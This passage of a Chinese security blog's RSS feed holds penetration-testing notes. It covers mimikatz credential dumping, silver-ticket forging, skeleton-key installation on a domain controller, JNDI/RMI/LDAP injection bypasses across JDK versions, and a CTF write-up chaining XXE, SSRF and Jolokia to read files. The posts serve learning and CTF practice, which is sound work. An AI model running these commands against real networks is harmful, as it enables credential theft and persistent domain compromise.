&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; 1.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;2.伪造白银票据&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参数说明：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/domain：当前域名称
/sid：SID值，和金票一样取前面一部分
/target：目标主机，这里是OWA2010SP3.0day.org
/service：服务名称，这里需要访问共享文件，所以是cifs
/rc4：目标主机的HASH值
/user：伪造的用户名
/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这时通过klist查看当前会话的kerberos票据可以看到生成的票据。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;dir \\OWA2010SP3.0day.org\c$&lt;/code&gt;访问DC的共享文件夹。&lt;/p&gt;
&lt;h3 id=&#34;skeleton-key&#34;&gt;skeleton key&lt;/h3&gt;
&lt;p&gt;skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#在域控上安装 skeleton key
mimikatz.exe privilege::debug &amp;quot;misc::skeleton&amp;quot;

#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz
net use \\WIN-9P499QKTLDO.adtest.com\c$ mimikatz /user:adtest\administrator`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#适用系统
windows 8.1
windows server 2012 及以上` 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
!+
!processprotect /process:lsass.exe /remove 
misc::skeleton`
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;ntlm中继&#34;&gt;NTLM中继&lt;/h2&gt;
&lt;p&gt;挖坑，待补&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/8117&#34;&gt;浅探内网横向移动-Pass The Hash&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/246440.html&#34;&gt;内网横向移动：利用WMI来渗透&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/bmjoker/p/10355934.html&#34;&gt;内网渗透之IPC$入侵&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/&#34;&gt;浅析黄金票据与白银票据&lt;/a&gt;&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/%E6%B8%97%E9%80%8F/">渗透</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/%E5%86%85%E7%BD%91/">内网</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>JNDI、RMI、LDAP防御和绕过总结</title>
                <link>https://blog.wh1sper.com/posts/jndirmildap%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</link>
                <guid isPermaLink="true">https://blog.wh1sper.com/posts/jndirmildap%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</guid>
                <pubDate>Sun, 13 Mar 2022 16:13:45 &#43;0800</pubDate>
                
                    <author>pwned[&lt;at&gt;]qq.com (wh1sper)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;本篇原理分析较少，主要是总结梳理攻击，绕过手法&lt;/p&gt;
&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
&lt;h3 id=&#34;rmi调用流程&#34;&gt;RMI调用流程&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271610049.png&#34; alt=&#34;17cd7c7d4f9ef2c362efb3086c27417e.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;RMI基于反序列化，每次数据交换都存在序列化-反序列化操作，由此延伸出对三端的攻击手法&lt;/p&gt;
&lt;h3 id=&#34;jndi攻击手法&#34;&gt;JNDI攻击手法&lt;/h3&gt;
&lt;p&gt;通常 JNDI 注入攻击的都是 lookup 方法的执行者，一般步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;目标机器中调用了 &lt;code&gt;InitialContext.lookup(URL)&lt;/code&gt;，且 URL 为用户可控&lt;/li&gt;
&lt;li&gt;攻击者控制这个 URL 为一个恶意的 RMI 服务地址：&lt;code&gt;rmi://hack:port/name&lt;/code&gt;或者&lt;code&gt;ldap://xxx/xxx&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;恶意 RMI/ldap 服务会返回一个含有恶意 factory 的 Reference 对象或者直接返回恶意序列化数据&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;JNDI 注入可以通过 RMI 方式和 LDAP 方式来达到攻击效果。&lt;/li&gt;
&lt;li&gt;javax.naming.InitialContext.lookup(&#39;ldap://127.0.0.1:9999/#Exploit&#39;)&lt;/li&gt;
&lt;li&gt;org.springframework.jndi.JndiLocatorDelegate.lookup(&#39;rmi://127.0.0.1:1099/refObj&#39;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;jdk8u121&#34;&gt;&lt;strong&gt;jdk8u121&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;这个版本主要是ban掉了RMI的一些打法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;从jdk8u121开始，RMI加入了反序列化白名单机制(&lt;strong&gt;&lt;a href=&#34;https://www.twblogs.net/a/5e4efb52bd9eee101df6892d&#34;&gt;JEP290&lt;/a&gt;&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;在jdk8u121之后，对于Reference加载远程代码，jdk的信任机制，在通过rmi加载远程代码的时候，会判断环境变量&lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;是否为true，而其在121版本及后，默认为false。RMI远程Reference代码攻击方式开始失效&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;白名单绕过jep290绕过&#34;&gt;白名单绕过（JEP290绕过）&lt;/h3&gt;
&lt;p&gt;可以看这篇：&lt;a href=&#34;https://www.anquanke.com/post/id/259059&#34;&gt;RMI-JEP290的分析与绕过 - 安全客，安全资讯平台&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为了绕过&lt;strong&gt;JEP290&lt;/strong&gt;，ysoserial里面的JRMPClient链子，通过UnicastRef这个在RMI反序列化白名单内的gadget进行攻击：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用&lt;code&gt;ysoserial&lt;/code&gt;启动一个恶意的&lt;code&gt;JRMPListener&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;受害者启动注册中心(RMI Registry)&lt;/li&gt;
&lt;li&gt;攻击者启动Client调用&lt;code&gt;bind()&lt;/code&gt;操作&lt;/li&gt;
&lt;li&gt;注册中心（受害者）被反序列化攻击&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;如果我们可以控制 UnicastRef 中 LiveRef 所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，这其实就是 ysoserial 中的 payloads.JRMPClient 的原理。&lt;/p&gt;
&lt;p&gt;实际上ysoserial这个JRMPClient和JRMPListener就是利用JRMP协议对打&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;攻击过程：
&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271611301.png&#34; alt=&#34;0a195b875b83dececc1d8526523878e3.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;后续修复和绕过：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;绕过的修复版本：jdk8u231，在JDK8u231的&lt;code&gt;dirty&lt;/code&gt;函数中多了&lt;code&gt;setObjectInputFilter&lt;/code&gt;过程，所以用&lt;code&gt;UnicastRef&lt;/code&gt;就没法再进行绕过了。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1.&lt;/code&gt;修复版本的绕过：国外安全研究人员&lt;code&gt;@An Trinhs&lt;/code&gt;发现了一个gadgets利用链，能够直接反序列化&lt;code&gt;UnicastRemoteObject&lt;/code&gt;造成反序列化漏洞。参考：&lt;a href=&#34;https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1&#34;&gt;RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;在上面的 Bypass 中，UnicastRef 类用了一层包装，通过递归的形式触发反序列化；通过 DGCClient 向 JRMPListener 发起 JRMP 请求，而这条 Gadget 是直接利用一次反序列化发起 JRMP 请求&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;code&gt;2.&lt;/code&gt;绕过的修复版本：jdk8u241，在调用&lt;code&gt;UnicastRef.invoke&lt;/code&gt;之前，做了一个检测。声明方法的类，必须要实现&lt;code&gt;Remote&lt;/code&gt;接口，然而这里的&lt;code&gt;RMIServerSocketFactory&lt;/code&gt;并没有实现，于是无法进入到invoke方法，直接抛出错误。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;使用ldap&#34;&gt;使用ldap&lt;/h3&gt;
&lt;p&gt;在这个版本还没有ban掉ldap的Reference对象和ldap直接返回恶意序列化数据&lt;/p&gt;
&lt;h3 id=&#34;服务端object参数暴露&#34;&gt;服务端Object参数暴露&lt;/h3&gt;
&lt;p&gt;这个其实就是正常RMI Client攻击Server的手法。&lt;/p&gt;
&lt;p&gt;例如，远程调用的接口 RemoteInterface 存在一个 sayGoodbye 方法的参数是 Object 类型。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/main/img/202212271612915.png&#34; alt=&#34;cad6d7a0109df4f446a58467d0dbf87c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;RMI的传输100%基于反序列化，那我们就直接可以传一个反序列化 payload 进去执行反序列化。&lt;/p&gt;
&lt;p&gt;如果参数不是Object还有后续绕过：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;由于攻击者可以完全控制客户端，因此他可以用恶意对象替换从Object类派生的参数（例如String）有几种方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;将java.rmi软件包的代码复制到新软件包，然后在其中更改代码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将调试器附加到正在运行的客户端，并在序列化对象之前替换对象&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用Javassist之类的工具更改字节码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;通过实现代理来替换网络流上已经序列化的对象&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;也被su18师傅称为替身攻击：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;afanti师傅用的是通过RASP hook住&lt;code&gt;java.rmi.server.RemoteObjectInvocationHandler&lt;/code&gt;类的&lt;code&gt;InvokeRemoteMethod&lt;/code&gt;方法的第三个参数非Object的改为Object的gadget。他的项目地址在&lt;a href=&#34;https://github.com/Afant1/RemoteObjectInvocationHandler&#34;&gt;RemoteObjectInvocationHandler&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;jdk8u191&#34;&gt;jdk8u191&lt;/h2&gt;
&lt;p&gt;这个版本ban掉了ldap的Reference对象&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在jdk8u191之后，加入LDAP远程Reference代码信任机制，LDAP远程代码攻击方式开始失效，也就是系统变量&lt;code&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt;默认为false（CVE-2018-3149）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;高版本绕过主要有两种方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;LDAP Server 直接返回恶意序列化数据，但需要目标环境存在 Gadget 依赖&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用本地 Factory 绕过（主要是利用了 &lt;code&gt;org.apache.naming.facotry.BeanFactory&lt;/code&gt; 类）&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ldap直接返回序列化数据&#34;&gt;ldap直接返回序列化数据&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;搭建恶意LDAP Server，可以直接改 &lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec&lt;/a&gt; 里面的：&lt;/li&gt;
&lt;li&gt;受害者 lookup 方法参数可控，执行 ldap://xxx/xxx&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;利用本地-factory-绕过&#34;&gt;利用本地 Factory 绕过&lt;/h3&gt;
&lt;p&gt;在 Reference 类中的 factory Class，要求实现 ObjectFactory 接口，在 &amp;quot;NamingManager#getObjectFactoryFromReference&amp;quot; 方法中的逻辑是这样的：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;优先从本地加载 factory，这就要求 factory Class 在本地的 ClassPath 中&lt;/li&gt;
&lt;li&gt;本地加载不到会从 codebase 处加载，&lt;strong&gt;但是由于高版本 jdk 默认不信任 codebase，在一般情况下无法利用&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;在加载完 factory 之后会强制类型转换为 &lt;code&gt;javax.naming.spi.ObjectFactory&lt;/code&gt; 接口类型，之后调用 &lt;code&gt;factory.getObjectInstance()&lt;/code&gt; 方法&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以如果找可以利用的 factory 就要满足下面的要求：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在目标的 ClassPath 中，且实现了 &lt;code&gt;javax.naming.spi.ObjectFactory&lt;/code&gt; 接口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;其 &lt;code&gt;getObjectInstance&lt;/code&gt; 方法可以被利用&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;（其中一条Gadget）这个可用的 factory 类为 &lt;code&gt;org.apache.naming.BeanFactory&lt;/code&gt;，位于 tomcat 的依赖包中，此外，这个 factory 绕过需要搭配 &lt;code&gt;javax.el.ELProcessor&lt;/code&gt; 执行任意的 EL 表达式来完成 RCE，依赖：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-XML&#34; data-lang=&#34;XML&#34;&gt; &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat-catalina&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;8.5.0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
 &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
 
 &lt;span class=&#34;c&#34;&gt;&amp;lt;!-- 加载ELProcessor时需要 --&amp;gt;&lt;/span&gt;
 &lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.tomcat.embed&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;tomcat-embed-el&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;8.5.0&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
 &lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://paper.seebug.org/942/&#34;&gt;如何绕过高版本 JDK 的限制进行 JNDI 注入利用 - 安全客&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cert.360.cn/report/detail?id=add23f0eafd94923a1fa116a76dee0a1&#34;&gt;RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.anquanke.com/post/id/259059&#34;&gt;RMI-JEP290的分析与绕过 - 安全客，安全资讯平台&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://y4er.com/post/bypass-jep290/&#34;&gt;Bypass JEP290 - Y4er&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html&#34;&gt;如何绕过高版本JDK的限制进行JNDI注入利用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/&#34;&gt;浅析高低版JDK下的JNDI注入及绕过 [Mi1k7ea]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://tttang.com/archive/1611/&#34;&gt;JNDI注入分析 - 跳跳糖&lt;/a&gt;&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/jndi/">JNDI</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/rmi/">RMI</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/ldap/">LDAP</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>Jolokia读写文件新姿势</title>
                <link>https://blog.wh1sper.com/posts/jolokia%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B0%E5%A7%BF%E5%8A%BF/</link>
                <guid isPermaLink="true">https://blog.wh1sper.com/posts/jolokia%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B0%E5%A7%BF%E5%8A%BF/</guid>
                <pubDate>Wed, 01 Dec 2021 13:11:00 &#43;0800</pubDate>
                
                    <author>pwned[&lt;at&gt;]qq.com (wh1sper)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;之前看到一个Jolokia新的利用姿势：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://thinkloveshare.com/hacking/ssrf_to_rce_with_jolokia_and_mbeans/&#34;&gt;SSRF to RCE with Jolokia and MBeans&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这篇文章介绍了在SSRF只能GET请求的场景下，Jolokia一些读写文件，加载.so文件的利用方法&lt;/p&gt;
&lt;p&gt;我参考这篇文章，结合了之前APISandbox的一些打法出在了 &lt;a href=&#34;https://ctf.njupt.edu.cn/727.html&#34;&gt;NCTF 2021&lt;/a&gt; 上面&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Java管理扩展（JavaManagementExtensions，JMX）是一种Java技术，它提供用于管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络的工具，这些资源由被称为MBean（Managed Bean）的对象表示。在JMX API中，可以动态加载和实例化类。可以使用Java动态管理工具包设计和开发管理和监视应用程序。&lt;/p&gt;
&lt;p&gt;Jolokia是一个JMX-HTTP桥接器，它可以利用JSON通过HTTP实现JMX远程管理，具有快速、简单等特点。除了支持基本的JMX操作之外，它还提供一些独特的特性来增强JMX远程管理如：批量请求，细粒度安全策略等。&lt;/p&gt;
&lt;p&gt;我们通过阅读&lt;a href=&#34;https://jolokia.org/reference/html/protocol.html&#34;&gt;官方文档&lt;/a&gt;可以知道，Jolokia URL模式大概是：&lt;code&gt;/jolokia/action/package:MBeanSelector/method/param1/param2&lt;/code&gt;这个样子，使用&lt;code&gt;/&lt;/code&gt;的时候需要用&lt;code&gt;!&lt;/code&gt;转义&lt;/p&gt;
&lt;p&gt;文章中提到了几种（GET请求触发）手法，分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用&lt;code&gt;vmSystemProperties&lt;/code&gt;获取JVM信息&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;JavaFlightRecorder&lt;/code&gt;任意文件写&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;compilerDirectivesAdd&lt;/code&gt;任意文件读&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;jvmtiAgentLoad&lt;/code&gt;任意加载 .so&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;vmLog&lt;/code&gt;写入日志文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;作者通过&lt;code&gt;vmlog&lt;/code&gt;往Tomcat ROOT路径写jsp webshell来实现从SSRF到RCE的转变。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011307334.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;当时正在构思NCTF校赛出什么题目，看到这几种利用手法，就想着结合之前APISandbox的一些东西，出一道actuator的综合利用，题目设计大概是这样的：&lt;/p&gt;
&lt;p&gt;一个正常的Springboot应用，&lt;code&gt;/actuator&lt;/code&gt;配置里面暴露了一些本来不应该暴露的端点，其中就有jolokia，env等&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011307472.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接访问&lt;code&gt;/actuator/jolokia/&lt;/code&gt;会403，是因为我使用SpringSecurity限制了本地IP访问&lt;/p&gt;
&lt;p&gt;用APIKit扫描，或者访问&lt;code&gt;/actuator/mappings&lt;/code&gt;可以看到有一个隐藏的API&lt;code&gt;/user/list&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011308743.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个API返回XML数据，可以自然想到XXE。&lt;/p&gt;
&lt;p&gt;为了不让XXE直接读文件，我加了waf过滤了除http协议之外的协议，预期是利用XXE来SSRF打&lt;code&gt;/actuator/jolokia/&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这儿有俩坑点，docker端口是开在58082的，SSRF的时候请求端口需要访问&lt;code&gt;/actuator/env&lt;/code&gt;来获得，是8080&lt;/p&gt;
&lt;p&gt;构造SSRF之后，访问&lt;code&gt;/actuator/jolokia/list&lt;/code&gt;会发现报错：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011308716.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;这是因为&lt;code&gt;/jolokia/list&lt;/code&gt;返回的数据太长了，而且里面有一些特殊符号会报&lt;code&gt;XML document structures must start and end within the same entity.&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;于是后面给了附件pom.xml，可以本地起起来看一下有什么Mbean。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011308295.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后可以判断远程环境是否存在这个Mbean：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011308676.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果不存在返回的是上图，如果存在返回的是下图两种情况&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202112011308232.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么便可以直接用&lt;code&gt;com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/flag&lt;/code&gt;来读取flag了。&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/java/">Java</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/jolokia/">Jolokia</category>
                                
                            
                        
                    
                
            </item>
        
    </channel>
</rss>
